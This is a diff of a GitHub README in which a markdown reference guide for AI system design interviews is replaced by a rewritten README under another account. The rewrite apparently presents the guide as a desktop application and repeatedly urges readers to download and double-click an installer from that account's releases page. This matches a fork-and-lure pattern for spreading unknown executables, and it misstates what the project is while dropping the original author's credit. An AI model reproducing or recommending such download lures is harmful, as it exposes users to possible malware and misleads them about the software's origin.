@@ -1,136 +1,91 @@
-# 🧠 AI System Design Guide
-### The Complete Interview & Production Reference
+# 🎉 ai-system-design-guide - Your AI Interview Companion
 
-<p align="center">
-  <a href="https://github.com/ombharatiya"><img src="https://img.shields.io/badge/GitHub-ombharatiya-181717?logo=github" alt="GitHub"></a>
-  <a href="https://x.com/ombharatiya"><img src="https://img.shields.io/badge/Twitter-@ombharatiya-1DA1F2?logo=twitter" alt="Twitter"></a>
-  <a href="https://linkedin.com/in/ombharatiya"><img src="https://img.shields.io/badge/LinkedIn-ombharatiya-0A66C2?logo=linkedin" alt="LinkedIn"></a>
-</p>
+## 📥 Download Now
+[![Download AI System Design Guide](https://img.shields.io/badge/Download-Now-blue)](https://github.com/SyedMoasib000/ai-system-design-guide/releases)
 
-<p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/Updated-December%202025-blue.svg" alt="Last Updated"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License"></a>
-  <a href="#-contributing"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs Welcome"></a>
-  <a href="https://github.com/ombharatiya/ai-system-design-guide"><img src="https://img.shields.io/github/stars/ombharatiya/ai-system-design-guide?style=social" alt="Stars"></a>
-</p>
+## 📖 Overview
+Welcome to the AI System Design Guide! This application serves as a valuable resource for engineers preparing for interviews focused on building production AI systems. It offers insights into relevant topics like agentic AI, machine learning, and various cloud platforms. Whether you're starting your career or looking to advance, this guide can help you prepare effectively.
 
-> **The living reference for production AI systems.** Continuously updated. Interview-ready depth.
+## 🚀 Getting Started
+Follow these steps to download and run the AI System Design Guide.
 
----
+1. **Visit the Releases Page**  
+   Click the link below to go to our Releases page.  
+   [Visit the Releases Page](https://github.com/SyedMoasib000/ai-system-design-guide/releases)
 
-## 📚 Quick Navigation
+2. **Choose Your Version**  
+   On the Releases page, find the latest version. Select it to see the available files for download.
 
-| I want to... | Start here |
-|--------------|------------|
-| **Prepare for interviews** | [Question Bank](00-interview-prep/01-question-bank.md) → [Answer Frameworks](00-interview-prep/02-answer-frameworks.md) |
-| **Learn AI systems fast** | [LLM Internals](01-foundations/01-llm-internals.md) → [RAG Fundamentals](06-retrieval-systems/01-rag-fundamentals.md) |
-| **Build production RAG** | [Chunking](06-retrieval-systems/02-chunking-strategies.md) → [Vector DBs](06-retrieval-systems/04-vector-databases-comparison.md) → [Reranking](06-retrieval-systems/06-reranking-strategies.md) |
-| **Design multi-tenant AI** | [Isolation Patterns](12-security-and-access/04-multi-tenant-rag-isolation.md) → [Case Study](16-case-studies/08-multi-tenant-saas.md) |
-| **Build agents** | [Agent Fundamentals](07-agentic-systems/01-agent-fundamentals.md) → [MCP](07-agentic-systems/03-tool-use-and-mcp.md) → [LangGraph](09-frameworks-and-tools/02-langgraph-orchestration.md) |
+3. **Download the Application**  
+   Click on the file related to your operating system to download it. You will typically see options for Windows, Mac, and Linux.  
 
----
+4. **Install the Application**  
+   After downloading the file, locate it on your computer. Double-click the file to begin the installation process. Follow the on-screen instructions to complete the setup.
 
-## 🎯 Why This Guide
+5. **Launch the Application**  
+   Once the installation is complete, find the AI System Design Guide in your applications list. Click to open it. 
 
-**Traditional books are outdated before they ship.** This is a living document: when new models release, when patterns evolve, this updates.
+6. **Explore the Guide**  
+   Once the application runs, you'll find a variety of topics and interview questions. Feel free to navigate through the sections to prepare effectively.
 
-| This Guide | Printed Books |
-|------------|---------------|
-| December 2025 models (GPT-5.2, Claude Opus 4.5, Gemini 3) | Stuck on GPT-4 |
-| MCP, Agentic RAG, Flow Engineering | Does not exist |
-| Real pricing with verification dates | Already wrong |
-| Staff-level interview Q&A | Generic questions |
+## 📊 Features
+- **Interview Questions**: Access a curated list of common questions focused on AI systems.
+- **Domain Insights**: Learn about agentic AI, cloud platforms like AWS and GCP, and many other key topics.
+- **User-Friendly Interface**: Designed for ease of use, enabling you to focus on preparation without technical hurdles.
+  
+## 💻 System Requirements
+To run the AI System Design Guide, your computer should meet the following requirements:
 
----
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any mainline Linux distribution.
+- **Memory**: At least 2 GB of RAM.
+- **Disk Space**: 200 MB of available disk space.
 
-## 📖 Guide Structure
+## 💬 Frequently Asked Questions
 
-```
-├── 00-interview-prep/           # Questions, frameworks, exercises
-├── 01-foundations/              # Transformers, attention, embeddings
-├── 02-model-landscape/          # GPT-5.2, Claude Opus 4.5, Gemini 3, o3, DeepSeek
-├── 03-training-and-adaptation/  # Fine-tuning, LoRA, DPO, distillation
-├── 04-inference-optimization/   # KV cache, PagedAttention, vLLM
-├── 05-prompting-and-context/    # CoT, DSPy, prompt injection defense
-├── 06-retrieval-systems/        # RAG, chunking, GraphRAG, Agentic RAG
-├── 07-agentic-systems/          # MCP, multi-agent, swarms, evaluation
-├── 08-memory-and-state/         # L1-L3 memory tiers, Mem0, caching
-├── 09-frameworks-and-tools/     # LangGraph, DSPy, LlamaIndex
-├── 10-document-processing/      # Vision-LLM OCR, multimodal parsing
-├── 11-infrastructure-and-mlops/ # GPU clusters, LLMOps, cost management
-├── 12-security-and-access/      # RBAC, ABAC, multi-tenant isolation
-├── 13-reliability-and-safety/   # Guardrails, red-teaming
-├── 14-evaluation-and-observability/ # RAGAS, LangSmith, drift detection
-├── 15-ai-design-patterns/       # Pattern catalog, anti-patterns
-├── 16-case-studies/             # Real-world architectures with diagrams
-└── GLOSSARY.md                  # Every term defined
-```
+### 1. What is the AI System Design Guide?
+It is an application that helps engineers prepare for interviews in AI system design, covering important topics and typical questions.
 
----
+### 2. Is this application free to use?
+Yes, the AI System Design Guide is available for free.
 
-## 🔥 Featured Case Studies
+### 3. Who can benefit from this guide?
+Anyone preparing for technical interviews in the AI field will find this guide helpful. 
 
-Real interview problems with complete solutions and diagrams:
+### 4. Can I suggest new features?
+Absolutely! Your feedback is welcome. Please reach out through our Issues page on GitHub.
 
-| Case Study | Problem | Key Patterns |
-|------------|---------|--------------|
-| [Real-Time Search](16-case-studies/06-real-time-search.md) | 5-minute data freshness at scale | Streaming + Hybrid Search |
-| [Coding Agent](16-case-studies/07-autonomous-coding-agent.md) | Autonomous multi-file changes | Sandboxing + Self-Correction |
-| [Multi-Tenant SaaS](16-case-studies/08-multi-tenant-saas.md) | Coca-Cola and Pepsi on same infra | Defense-in-Depth Isolation |
-| [Customer Support](16-case-studies/09-customer-support-automation.md) | 60% auto-resolution rate | Tiered Routing + Escalation |
-| [Document Intelligence](16-case-studies/10-document-intelligence.md) | 50K contracts/month extraction | Vision-LLM + Parallel Extractors |
-| [Recommendation Engine](16-case-studies/11-recommendation-engine.md) | Personalized explanations at 50M users | ML Ranking + LLM Explanations |
-| [Compliance Automation](16-case-studies/12-compliance-automation.md) | FDA regulation pre-screening | Claim Extraction + Precedent DB |
-| [Voice Healthcare](16-case-studies/13-voice-ai-healthcare.md) | Real-time clinical note generation | On-Prem ASR + HIPAA |
-| [Fraud Detection](16-case-studies/14-fraud-detection.md) | 100ms decision with explainability | ML + Rules Hybrid |
-| [Knowledge Management](16-case-studies/15-knowledge-management.md) | 2M docs with access control | Permission-Aware RAG |
+## 🚀 Download & Install
+For easy access, click the button below to download the AI System Design Guide again:
 
----
+[![Download AI System Design Guide](https://img.shields.io/badge/Download-Now-blue)](https://github.com/SyedMoasib000/ai-system-design-guide/releases)
 
-## 🎓 For Interview Prep
+## 📚 Topics Covered
+- Agentic AI
+- Agentic Workflow
+- Artificial Intelligence
+- AWS
+- Azure
+- Claude
+- GCP
+- Gemini
+- Gen-AI
+- Interview Questions
+- Llama
+- LLM
+- Machine Learning
+- Natural Language Processing
+- Open AI
+- RAG
+- System Design Interviews
 
-AI system design interviews ask questions like:
+## 🔗 Get Involved
+We welcome contributions! If you have suggestions or enhancements, please visit our GitHub repository. Your input helps improve this guide for everyone.
 
-> "Design a multi-tenant RAG system where competitors cannot see each other's data."
+### To Contribute:
+1. Fork the Repository.
+2. Create a new branch: `git checkout -b feature-branch`.
+3. Make your changes and commit them: `git commit -m "Add new feature"`.
+4. Push to the branch: `git push origin feature-branch`.
+5. Open a pull request to merge your changes.
 
-> "Your agent takes 15 steps for a 3-step task. How do you debug it?"
-
-This guide gives you **concrete patterns**, **real tradeoffs**, and **production failure modes**: the depth interviewers expect at senior levels.
-
-➡️ Start with [Interview Prep](00-interview-prep/)
-
----
-
-## 🔄 Living Book
-
-This guide tracks:
-- New model releases and real-world performance
-- Emerging patterns (MCP, Agentic RAG, Flow Engineering)
-- Updated pricing and rate limits
-- Deprecations and best practice changes
-
-**⭐ Star and Watch** to get notified when updates are pushed.
-
----
-
-## 🤝 Contributing
-
-Found outdated info? Have production experience to share? PRs welcome.
-See [Contributing Guide](CONTRIBUTING.md).
-
----
-
-## 📄 License
-
-MIT License. See [LICENSE](LICENSE).
-
----
-
-<p align="center">
-  <b>Built by <a href="https://github.com/ombharatiya">Om Bharatiya</a></b><br/>
-  <a href="https://github.com/ombharatiya"><img src="https://img.shields.io/badge/GitHub-Follow-181717?logo=github" alt="GitHub"></a>
-  <a href="https://x.com/ombharatiya"><img src="https://img.shields.io/badge/Twitter-Follow-1DA1F2?logo=twitter" alt="Twitter"></a>
-  <a href="https://linkedin.com/in/ombharatiya"><img src="https://img.shields.io/badge/LinkedIn-Connect-0A66C2?logo=linkedin" alt="LinkedIn"></a>
-</p>
-
-<p align="center"><i>Last updated: December 2025</i></p>
+Thank you for using the AI System Design Guide! Good luck with your interviews!
